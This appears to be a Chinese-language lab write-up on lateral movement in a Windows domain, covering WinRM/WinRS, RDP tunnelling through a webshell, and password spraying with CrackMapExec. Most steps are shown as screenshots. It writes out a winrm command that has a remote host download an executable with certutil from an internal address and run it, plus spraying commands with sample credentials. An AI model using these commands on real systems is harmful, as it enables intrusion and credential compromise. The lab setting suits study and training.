
# 协议-横向
### WinRM      

### WinRS   

一种横向移动的协议

利用条件：

1、win 2012之前利用需要手动开启winRM ，在win 2012之后(包括win 2012)的版本是默认开启的， 

2、防火墙对5986、5985端口开放。

​    先扫端口是否开放   5986、5985 （这里最好还是先提到system，在扫5985端口情况）

![1733135556613](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942174.png)

小插曲：

需要先开启WinRM服务：

![1733136365631](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942175.png)

winrs执行远程命令：

![1733136408276](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942176.png)

 解决cs上执行WinRM报错（cs不支持交互式），换一种执行方式。

![1733136693156](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942177.png)

用cs自带的插件运行也报错：

![1733136825756](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942178.png)

换了一种方式执行：

![1733136917715](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942179.png)

防火墙：

![1733141575985](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942180.png)

  反向

![1733142490112](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942181.png)

35 演示反向--------web站点（web机没有开web服务）  sql机打开防火墙：（入站拦截，出站不拦截）：

转发上线-----监听----用刚才的shell winrm invoke Create wmicimv2/win32_process @{CommandLine="cmd.exe /c certutil -urlcache -split -f http//192.168.3.31/4444.exe 4444.exe & 4444.exe"} -r:sqlserver -u:sqlserver\administrator -p:admin!@#45       执行上线

### RDP 

远程终端连接服务

对方开启RDP服务 3389 端口          远程桌面

​            还是socks代理，设置好后可以用mstac连接

![1733145385480](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942182.png)

连  隧道（http），这里是用冰鞋上传的后门建立的http隧道，实现内网穿透，将目标的3389远程终端连接端口映射到本地，不过这里需要的流量太大，冰鞋支持不了。其他的方法：frp,nps，iox等方法都需要上传到目标机，所以还是选用http隧道。

![1733145945752](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942183.png)

正常连接时：

![1733146097700](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942184.png)

用冰鞋连接尝试http代理，看能否实现映射，端口为3389，RDP服务的：（刚才的shell.asp不支持，这里的.aspx支持）

![1733146130190](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942185.png)

这时再来连接：

就可以了，不过冰鞋的流量不支持，这流量太大了，所以不稳定

1h      hash连接，需要在被控机上操作，用mimikatz将hash值导入到目标机，这种方式对系统也有要求。有些鸡肋

sharpRDP:        一款工具，不用自己手动的连接远程桌面，不过不建

### CrackMapExec-密码喷射

解决了域内用户多，密码多，账户多等问题。不错的工具。

  这款工具有windows 也有 linux  ，都需要安装配置，这里选用的是kali自带的。不过前提需要先配置好代理---socks                    

kali下改socks代理的配置文件：       环境说明：kali是通信不到3网段的web和sql机的。

![1733147257820](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942186.png)

这里说明：域内用户，域内本地用户。比如:：web 机dbadmin用户就是域内用户，域内本地用户就是web 机的administrator

先拿到域内用户，然后net user /domain        ，存到1.txt中。然后抓取密码得到hash值或者明文

![1733147957938](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942187.png)

开始喷射：

![1733148177350](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942188.png)

 有＋号就是喷射成功：

![1733148493587](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942189.png)



​    

proxychains4 crackmapexec smb 192.168.3.21-32 -u administrator -p 'admin!@#45'           这是登录域内adminstrator 用户域，就是DC，密码应为：Admin12345      这里就没有+号

![1733148523010](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942190.png)

proxychains4 crackmapexec smb 192.168.3.21-32 -u administrator -p 'admin!@#45' --local-auth 这是登录域内本地用户的administrator  

![1733148709400](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942191.png)

![1733148697349](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942192.png)

还可以执行上线命令（全部测试的）：

![1733148884794](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942193.png)

成功的都上线了：

![1733148903706](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942194.png)

还可以创建密码字典，hash字典等操作手法很多  https://www.cnblogs.com/Yang34/p/14411497.html
